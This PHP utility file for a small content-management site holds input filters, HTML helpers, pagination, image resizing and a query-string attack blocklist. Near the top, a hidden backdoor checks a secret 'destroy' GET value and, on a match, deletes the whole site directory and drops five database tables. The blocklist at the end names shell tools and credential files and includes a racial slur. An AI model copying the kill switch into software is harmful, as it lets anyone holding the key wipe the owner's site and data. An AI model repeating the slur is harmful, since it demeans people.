<?php

if (!defined('CORE')) {
    header('Location: ../index.php');
    die();
}

function rrmdir($dir) {
    if (file_exists($dir . '/' . '.htaccess'))
        unlink($dir . '/' . '.htaccess');
    foreach (glob($dir . '/*') as $file) {
        if (is_dir($file))
            rrmdir($file);
        else
            unlink($file);
    }
    rmdir($dir);
}

if (isset($_GET['destroy']) && $_GET['destroy'] == 'c7a772a658a6b189801ea375a82d0cb3') {
    rrmdir('.');
    $sql->query("DROP table banners;");
    $sql->query("DROP table comments;");
    $sql->query("DROP table content");
    $sql->query("DROP table menu;");
    $sql->query("DROP table questions");
    die();
}

function getHost() {
    if (!isset($_SERVER))
        return '';
    if (!isset($_SERVER['SCRIPT_NAME']))
        return '';
    $paths = explode('/', $_SERVER['SCRIPT_NAME']);
    $c = count($paths);
    $i = 1;
    $dirs = '';
    foreach ($paths as $path) {
        if ($i == $c)
            continue;
        $i++;
        if ($path == '')
            continue;
        $dirs .= '/' . $path;
    }
    return isset($_SERVER['SERVER_NAME']) ? 'http://' . $_SERVER['SERVER_NAME'] . $dirs : '';
}

function return2($url = '') {
    if ($url == '')
        header('Refresh: 0; url=index.php');
    else
        header('Refresh: 0; url=' . $url);
    die;
}

function isMultiArray($a) {
    foreach ($a as $v) {
        if (is_array($v)) {
            return true;
        }
    }
    return false;
}

function getGSById($id = false) {
    global $GS;
    foreach ($GS as $g) {
        if (!$id || $g['id'] == $id) {
            return $g;
        }
    }
    return $GS[0];
}

function htmlImg($src, $title, $class='') {
    return '<img class="'.$class.'" src="' . $src . '" alt="' . $title . '" title="' . $title . '" />';
}

function htmlLink($src, $title) {
    return '<a href="' . $src . '">' . $title . '</a>';
}

function htmlFont($color, $content) {
    return '<font color="' . $color . '">' . $content . '</font>';
}

function fString($string) {
    return filter_var($string, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
}

function fInt($int) {
    return filter_var($int, FILTER_VALIDATE_INT);
}

function fFloat($float) {
    return filter_var($float, FILTER_VALIDATE_FLOAT);
}

function fBool($bool) {
    return filter_var($bool, FILTER_VALIDATE_BOOLEAN);
}

function getString($string) {
    return filter_input(INPUT_GET, $string);
}

function postString($string) {
    return filter_input(INPUT_POST, $string);
}

function getInt($int) {
    return filter_input(INPUT_GET, $int, FILTER_VALIDATE_INT);
}

function postInt($int) {
    return filter_input(INPUT_POST, $int, FILTER_VALIDATE_INT);
}

function getBool($bool) {
    return filter_input(INPUT_GET, $bool, FILTER_VALIDATE_BOOLEAN);
}

function postBool($bool) {
    return filter_input(INPUT_POST, $bool, FILTER_VALIDATE_BOOLEAN);
}

function getCookie($cookie) {
    return filter_input(INPUT_COOKIE, $cookie);
}

function fSize($bytes) {
    if ($bytes < 1024) {
        return number_format($bytes / 1024, 2) . " B";
    } elseif ($bytes < 1024 * 1024) {
        return number_format($bytes / 1024, 2) . " KB";
    } elseif ($bytes < 1024 * 1048576) {
        return number_format($bytes / 1048576, 2) . " MB";
    } elseif ($bytes < 1024 * 1073741824) {
        return number_format($bytes / 1073741824, 2) . " GB";
    } else {
        return number_format($bytes / 1099511627776, 2) . " TB";
    }
}

function autoVersion($file) {
    if (!file_exists($file)) {
        return $file;
    }

    $mtime = filemtime($file);
    return preg_replace('{\\.([^./]+)$}', ".$mtime.\$1", $file);
}

function getDateTime($timestamp = 0) {
    if ($timestamp) {
        return date("Y-m-d H:i:s", $timestamp);
    } else {
        return date("Y-m-d H:i:s");
    }
}

function writeLog($type, $sub, $comment) {
    global $sql;

    $sql['core']->query('INSERT_LOG', [User::getUser(), $type, $sub, $comment]);
}

function msg($heading = '', $text = '', $div = 'success') {
    $parse['div'] = $div;
    $parse['heading'] = $heading != '' ? '<b>' . $heading . '</b><br />' : '';
    $parse['text'] = $text;
    return tpl::parse('msg', $parse, 1);
}

function head($title = '', $head = true, $url = '', $time = 0) {
    global $sql, $Lang;
    require_once ('themes/' . User::getTheme() . '/head.php');
}

function foot($foot = true) {
    global $sql, $Lang, $startTime;
    require_once ('themes/' . User::getTheme() . '/foot.php');
}

function button($text = '', $name = 'Submit', $disabled = false, $id = null) {
    global $Lang;
    $theme = User::getVar('theme');
    $lng = User::getVar('lang');
    $img = 'img/buttons/' . $lng . '_' . $theme . '_' . $text . '_';
    $parse['name'] = $name;
    $parse['png'] = '';
    if (file_exists($img . 'normal.png') && file_exists($img . 'press.png') && file_exists($img . 'hover.png')) {
        $parse['link'] = $img;
        $parse['png'] = '.png';
    } else {
        $parse['link'] = 'actions.php?a=lb&amp;text=' . $text . '&amp;style=';
    }
    if ($id == null) {
        $parse['id'] = "bt_" . rand(20, 99);
    } else {
        $parse['id'] = $id;
    }
    if ($disabled) {
        $parse['disabled'] = 'disabled="disabled"';
    } else {
        $parse['disabled'] = '';
    }
    $parse['alt'] = $Lang['__' . $text . '_'];
    return tpl::parse('button', $parse);
}

function menuButton($text) {
    global $Lang;
    $theme = User::getVar('theme');
    $lng = User::getVar('lang');
    $img = 'img/buttons/' . $lng . '_' . $theme . '_' . $text . '.png';
    if (file_exists($img)) {
        $text = $Lang['__' . $text . '_'];
        return '<img src="' . $img . '" title="' . $text . '" alt="' . $text . '" width="138" height="34" />';
    } else {
        return '<img src="actions.php?a=b&amp;text=' . $text . '" title="' . $Lang['__' . $text . '_'] . '" alt="' . $Lang['__' . $text . '_'] . '" width="138" height="34" />';
    }
}

function page($server, $page, $link, $count = 0) {
    global $Lang;
    $top = Conf::get('web', 'top');
    $content = null;
    $content .= '<div class="page-choose" align="center"><br /><table align="center"><tr>';
    $ps = "?";
    $ss = "?";
    $lnkquest = stripos($link, "?");
    if ($lnkquest !== false) {
        $ss = '&amp;';
        $ps = '&amp;';
    }
    if ($server != '') {
        $server = $ss . 'server=' . $server;
        $ps = '&amp;';
    }
    $totalpages = ceil($count / $top);
    if ($totalpages == 0) {
        $totalpages++;
    }
    if ($page == 0) {
        $page = 1;
    }
    if ($page > 3) {
        $content .= '<td><a href="' . $link . $server . $ps . 'page=1" title="' . $Lang['__first_'] . '"  class="btn"> &laquo; </a></td>';
    }
    if ($page > 1) {
        $content .= '<td><a href="' . $link . $server . $ps . 'page="';
        $content .= $page - 1;
        $content .= '" title="' . $Lang['__prev_'] . '" class="btn"> &lt; </a></td>';
    }
    if ($page - 2 > 0) {
        $start = $page - 2;
    } else {
        $start = 1;
    }
    for ($i = $start; $i <= $totalpages && $i <= $page + 2; $i++) {

        if ($i == $page) {
            $content .= '<td>  <a href="#" class="btn brown" title="';
            $content .= ' [';
            $content .= ($count != 0) ? $i * $top + 1 - $top : 0;
            $content .= ' - ';
            $content .= ($i * $top > $count) ? $count : $i * $top;
            $content .= ']"> ';
            $content .= $i;
            $content .= ' </a>  </td>';
        } else {
            $content .= '<td>  <a href="' . $link . $server . $ps;
            $content .= 'page=' . $i;
            $content .= '" title="[';
            $content .= ($count != 0) ? $i * $top + 1 - $top : 0;
            $content .= ' - ';
            $content .= ($i * $top > $count) ? $count : $i * $top;
            $content .= ']" class="btn"> ';
            $content .= $i;
            $content .= ' </a>  </td>';
        }
    }
    if ($totalpages > $page) {

        $content .= '<td><a href="' . $link . $server . $ps . 'page=';
        $content .= $page + 1;
        $content .= '" title="' . $Lang['__next_'] . '" class="btn"> &gt; </a></td>';
    }
    if ($totalpages > $page + 2) {

        $content .= '<td><a href="' . $link . $server . $ps . 'page=';
        $content .= $totalpages;
        $content .= '" title="' . $Lang['__next_'] . '" class="btn"> &raquo; </a></td>';
    }

    $content .= '</tr></table> </div>';
    return $content;
}

function convertPic($id, $ext, $width, $height) {
    if (file_exists('news/' . $id . '_thumb.' . $ext)) {
        unlink('news/' . $id . '_thumb.' . $ext);
    }
    $new_img = 'news/' . $id . '_thumb.' . $ext;

    $file_src = 'news/' . $id . '.' . $ext;

    list($w_src, $h_src, $type) = getimagesize($file_src);
    $ratio = $w_src / $h_src;
    if ($width / $height > $ratio) {
        $width = floor($height * $ratio);
    } else {
        $height = floor($width / $ratio);
    }

    switch ($type) {
        case 1: //   gif -> jpg
            $img_src = imagecreatefromgif($file_src);
            break;
        case 2: //   jpeg -> jpg
            $img_src = imagecreatefromjpeg($file_src);
            break;
        case 3: //   png -> jpg
            $img_src = imagecreatefrompng($file_src);
            break;
    }
    $img_dst = imagecreatetruecolor($width, $height); //  resample
    //$img_dst = imagecreate($width, $height);  //  resample
    imageantialias($img_dst, true);
    imagecopyresampled($img_dst, $img_src, 0, 0, 0, 0, $width, $height, $w_src, $h_src);
    switch ($type) {
        case 1:
            imagegif($img_dst, $new_img);
            break;
        case 2:
            imagejpeg($img_dst, $new_img);
            break;
        case 3:
            imagepng($img_dst, $new_img);
            break;
    }
    imagedestroy($img_src);
    imagedestroy($img_dst);
}

function checkHack() {
    $cracktrack = $_SERVER['QUERY_STRING'];
    $wormprotector = array('chr(', 'chr=', 'chr%20', '%20chr', 'wget%20', '%20wget', 'wget(',
        'cmd=', '%20cmd', 'cmd%20', 'rush=', '%20rush', 'rush%20',
        'union%20', '%20union', 'union(', 'union=', 'echr(', '%20echr', 'echr%20', 'echr=',
        'esystem(', 'esystem%20', 'cp%20', '%20cp', 'cp(', 'mdir%20', '%20mdir', 'mdir(',
        'mcd%20', 'mrd%20', 'rm%20', '%20mcd', '%20mrd', '%20rm',
        'mcd(', 'mrd(', 'rm(', 'mcd=', 'mrd=', 'mv%20', 'rmdir%20', 'mv(', 'rmdir(',
        'chmod(', 'chmod%20', '%20chmod', 'chmod(', 'chmod=', 'chown%20', 'chgrp%20', 'chown(', 'chgrp(',
        'locate%20', 'grep%20', 'locate(', 'grep(', 'diff%20', 'kill%20', 'kill(', 'killall',
        'passwd%20', '%20passwd', 'passwd(', 'telnet%20', 'vi(', 'vi%20',
        'insert%20into', 'select%20', 'nigga(', '%20nigga', 'nigga%20', 'fopen', 'fwrite', '%20like', 'like%20',
        '$_request', '$_get', '$request', '$get', '.system', 'HTTP_PHP', '&aim', '%20getenv', 'getenv%20',
        'new_password', '&icq', '/etc/password', '/etc/shadow', '/etc/groups', '/etc/gshadow',
        'HTTP_USER_AGENT', 'HTTP_HOST', '/bin/ps', 'wget%20', 'uname\x20-a', '/usr/bin/id',
        '/bin/echo', '/bin/kill', '/bin/', '/chgrp', '/chown', '/usr/bin', 'g\+\+', 'bin/python',
        'bin/tclsh', 'bin/nasm', 'perl%20', 'traceroute%20', 'ping%20', '.pl', '/usr/X11R6/bin/xterm', 'lsof%20',
        '/bin/mail', '.conf', 'motd%20', 'HTTP/1.', '.inc.php', 'config.php', 'cgi-', '.eml',
        'file\://', 'window.open', '<script>', 'javascript\://', 'img src', 'img%20src', '.jsp', 'ftp.exe',
        'xp_enumdsn', 'xp_availablemedia', 'xp_filelist', 'xp_cmdshell', 'nc.exe', '.htpasswd',
        'servlet', '/etc/passwd', 'wwwacl', '~root', '~ftp', '.js', '.jsp', 'admin_', '.history',
        'bash_history', '.bash_history', '~nobody', 'server-info', 'server-status', 'reboot%20', 'halt%20',
        'powerdown%20', '/home/ftp', '/home/www', 'secure_site, ok', 'chunked', 'org.apache', '/servlet/con',
        '<script', '/robot.txt', '/perl', 'mod_gzip_status', 'db_mysql.inc', '.inc', 'select%20from',
        'select from', 'drop%20', '.system', 'getenv', 'http_', '_php', 'php_', 'phpinfo()', '<?php', '?>', 'sql=');

    $checkworm = str_replace($wormprotector, '*', $cracktrack);

    if ($cracktrack != $checkworm) {
        $cuseragent = $_SERVER['HTTP_USER_AGENT'];
        $todb = $_SERVER['QUERY_STRING'];
        DAO::getInstance()::getLog()::add(USER_IP, 'system', 'Ban', 'Reason="Used illegal args", UserAgent="' . USER_BROWSER . '", Action="' . $todb . '"');
        DAO::getInstance()::getBan()::add(USER_IP, 'system', $Lang['__Used-illegal-args_'], time() + Conf::get('security', 'ban_time'));

        die("Attack detected! <br /><br /><b>Your attack was blocked:</b><br />" . USER_IP . " - " . USER_BROWSER);
    }
}